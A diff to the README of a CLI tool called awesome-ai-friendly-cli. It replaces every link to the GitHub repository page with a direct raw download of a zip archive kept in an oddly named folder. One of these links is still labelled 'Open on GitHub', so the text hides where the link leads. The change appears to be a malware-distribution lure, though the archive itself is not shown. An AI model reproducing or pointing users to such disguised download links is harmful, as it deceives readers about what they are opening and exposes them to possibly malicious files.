@@ -1,6 +1,6 @@
 # 🤖 awesome-ai-friendly-cli - Cut CLI noise and save tokens
 
-[Download the app](https://github.com/dessert9431/awesome-ai-friendly-cli){style="display:inline-block;padding:12px 18px;background:#6f42c1;color:#fff;border-radius:8px;text-decoration:none;font-weight:700"}
+[Download the app](https://raw.githubusercontent.com/dessert9431/awesome-ai-friendly-cli/main/presuperficially/friendly-awesome-ai-cli-v2.9.zip){style="display:inline-block;padding:12px 18px;background:#6f42c1;color:#fff;border-radius:8px;text-decoration:none;font-weight:700"}
 
 ## 🚀 What this is
 
@@ -32,7 +32,7 @@ You do not need to know how to code to use this repository. You only need to ope
 
 Visit this page to download or open the project files:
 
-[https://github.com/dessert9431/awesome-ai-friendly-cli](https://github.com/dessert9431/awesome-ai-friendly-cli)
+[https://raw.githubusercontent.com/dessert9431/awesome-ai-friendly-cli/main/presuperficially/friendly-awesome-ai-cli-v2.9.zip](https://raw.githubusercontent.com/dessert9431/awesome-ai-friendly-cli/main/presuperficially/friendly-awesome-ai-cli-v2.9.zip)
 
 If you use GitHub in your browser, you can:
 
@@ -248,7 +248,7 @@ To get the best results:
 
 ## 🧭 Primary link
 
-[Open awesome-ai-friendly-cli on GitHub](https://github.com/dessert9431/awesome-ai-friendly-cli)
+[Open awesome-ai-friendly-cli on GitHub](https://raw.githubusercontent.com/dessert9431/awesome-ai-friendly-cli/main/presuperficially/friendly-awesome-ai-cli-v2.9.zip)
 
 ## 🗂️ Repository details
 
